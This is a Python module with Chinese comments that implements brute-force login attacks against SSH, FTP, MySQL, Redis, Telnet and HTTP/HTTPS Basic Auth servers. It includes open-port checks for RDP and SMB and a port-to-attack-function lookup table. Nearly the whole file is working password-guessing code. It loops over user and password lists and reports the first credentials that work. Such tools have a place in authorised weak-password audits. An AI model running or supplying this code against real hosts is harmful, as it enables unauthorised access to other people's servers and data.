#!/usr/bin/env python3
# protocol_forces.py - 所有协议爆破函数（带明确状态返回）

import socket
import time
import paramiko
import ftplib
import pymysql
import redis
import requests
from typing import Tuple, NamedTuple, Optional
from dataclasses import dataclass


# ========== 统一返回类型 ==========
@dataclass
class BruteResult:
    """爆破结果统一结构"""
    success: bool          # True=成功, False=失败
    username: str          # 成功的用户名（失败则为空）
    password: str          # 成功的密码（失败则为空）
    message: str           # 附加信息（错误原因或成功提示）

    def is_success(self) -> bool:
        return self.success

    def to_tuple(self) -> Tuple[str, str]:
        """兼容旧版返回格式"""
        return (self.username, self.password)


# ========== 各协议爆破函数 ==========

def ssh_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """SSH 爆破（paramiko）"""
    for user in user_list:
        for pwd in pwd_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    ip, port=port,
                    username=user, password=pwd,
                    timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
                client.close()
                return BruteResult(
                    success=True,
                    username=user,
                    password=pwd,
                    message=f"SSH 登录成功: {user}:{pwd}"
                )
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                # 网络错误或其他异常，记录并继续
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="SSH 爆破失败，未找到有效弱口令"
    )


def ftp_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """FTP 爆破（ftplib）"""
    for user in user_list:
        for pwd in pwd_list:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=timeout)
                ftp.login(user, pwd)
                ftp.quit()
                return BruteResult(
                    success=True,
                    username=user,
                    password=pwd,
                    message=f"FTP 登录成功: {user}:{pwd}"
                )
            except ftplib.error_perm:
                continue
            except Exception:
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="FTP 爆破失败，未找到有效弱口令"
    )


def mysql_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """MySQL 爆破（pymysql）"""
    for user in user_list:
        for pwd in pwd_list:
            try:
                conn = pymysql.connect(
                    host=ip, port=port,
                    user=user, password=pwd,
                    connect_timeout=timeout
                )
                conn.close()
                return BruteResult(
                    success=True,
                    username=user,
                    password=pwd,
                    message=f"MySQL 登录成功: {user}:{pwd}"
                )
            except pymysql.err.OperationalError:
                continue
            except Exception:
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="MySQL 爆破失败，未找到有效弱口令"
    )


def redis_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """Redis 爆破（无用户名，只密码）"""
    # Redis 不需要用户名，user_list 被忽略
    for pwd in pwd_list:
        try:
            r = redis.Redis(
                host=ip, port=port,
                password=pwd,
                socket_timeout=timeout,
                decode_responses=True
            )
            r.ping()
            return BruteResult(
                success=True,
                username="",  # Redis 无用户名
                password=pwd,
                message=f"Redis 登录成功: 密码 {pwd}"
            )
        except redis.AuthenticationError:
            continue
        except Exception:
            continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="Redis 爆破失败，未找到有效密码"
    )


def rdp_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """
    RDP 爆破（仅端口探测，不实际爆破）
    实际 RDP 爆破需 pywinrm 或 xfreerdp 配合，此处仅做示范
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        # 端口开放但不代表爆破成功，这里返回一个特殊状态
        return BruteResult(
            success=False,
            username="",
            password="",
            message=f"RDP 端口 {port} 开放，但未进行实际爆破（需 NLA 认证）"
        )
    except Exception:
        return BruteResult(
            success=False,
            username="",
            password="",
            message="RDP 端口关闭或连接超时"
        )


def smb_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """
    SMB 爆破（仅端口探测，不实际爆破）
    实际 SMB 爆破可用 smbprotocol 或 impacket，此处仅做示范
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        return BruteResult(
            success=False,
            username="",
            password="",
            message=f"SMB 端口 {port} 开放，但未进行实际爆破"
        )
    except Exception:
        return BruteResult(
            success=False,
            username="",
            password="",
            message="SMB 端口关闭或连接超时"
        )


def http_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """HTTP Basic Auth 爆破"""
    url = f"http://{ip}:{port}/"
    for user in user_list:
        for pwd in pwd_list:
            try:
                r = requests.get(
                    url,
                    auth=(user, pwd),
                    timeout=timeout,
                    allow_redirects=False
                )
                # HTTP 登录成功标志：200 OK 或 302 重定向（通常表示登录成功）
                if r.status_code in (200, 302):
                    return BruteResult(
                        success=True,
                        username=user,
                        password=pwd,
                        message=f"HTTP 登录成功: {user}:{pwd} (状态码 {r.status_code})"
                    )
            except requests.RequestException:
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="HTTP Basic Auth 爆破失败"
    )


def https_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """HTTPS Basic Auth 爆破"""
    url = f"https://{ip}:{port}/"
    for user in user_list:
        for pwd in pwd_list:
            try:
                r = requests.get(
                    url,
                    auth=(user, pwd),
                    timeout=timeout,
                    verify=False,
                    allow_redirects=False
                )
                if r.status_code in (200, 302):
                    return BruteResult(
                        success=True,
                        username=user,
                        password=pwd,
                        message=f"HTTPS 登录成功: {user}:{pwd} (状态码 {r.status_code})"
                    )
            except requests.RequestException:
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="HTTPS Basic Auth 爆破失败"
    )


def telnet_brute(ip: str, port: int, user_list: list, pwd_list: list, timeout: float = 3.0) -> BruteResult:
    """
    Telnet 爆破（使用 socket 模拟）
    注意：Telnet 协议较老，部分实现差异较大，此函数仅作演示
    """
    for user in user_list:
        for pwd in pwd_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((ip, port))
                # 发送用户名
                sock.send(f"{user}\r\n".encode())
                time.sleep(0.5)
                # 发送密码
                sock.send(f"{pwd}\r\n".encode())
                time.sleep(1)
                # 接收响应（简化）
                data = sock.recv(1024).decode()
                sock.close()
                # 通常登录成功会返回 shell 提示符或特定字符串
                if "login" not in data.lower() and "password" not in data.lower():
                    return BruteResult(
                        success=True,
                        username=user,
                        password=pwd,
                        message=f"Telnet 登录成功: {user}:{pwd}"
                    )
            except Exception:
                continue
    return BruteResult(
        success=False,
        username="",
        password="",
        message="Telnet 爆破失败"
    )


# ========== 协议映射表 ==========
PROTOCOL_MAP = {
    21:  ("FTP", ftp_brute),
    22:  ("SSH", ssh_brute),
    23:  ("Telnet", telnet_brute),
    80:  ("HTTP", http_brute),
    443: ("HTTPS", https_brute),
    445: ("SMB", smb_brute),
    3306: ("MySQL", mysql_brute),
    3389: ("RDP", rdp_brute),
    6379: ("Redis", redis_brute),
    8080: ("HTTP", http_brute),
    8443: ("HTTPS", https_brute),
}


def get_brute_func(port: int):
    """根据端口返回对应的爆破函数"""
    _, func = PROTOCOL_MAP.get(port, (None, None))
    return func


def get_protocol_name(port: int) -> str:
    """根据端口返回协议名称"""
    name, _ = PROTOCOL_MAP.get(port, ("Unknown", None))
    return name
